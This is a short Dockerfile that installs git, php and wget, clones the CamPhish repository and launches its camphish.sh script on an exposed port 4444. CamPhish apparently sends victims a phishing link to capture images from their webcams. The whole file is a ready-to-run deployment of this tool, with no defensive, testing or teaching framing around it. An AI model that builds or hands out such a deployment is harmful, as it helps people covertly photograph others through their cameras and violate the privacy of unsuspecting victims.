FROM python:3.14.1-slim
RUN apt-get update && apt-get install -y git php wget
RUN git clone https://github.com/techchipnet/CamPhish.git /opt/camphish
WORKDIR /opt/camphish
EXPOSE 4444
ENTRYPOINT ["bash", "camphish.sh"]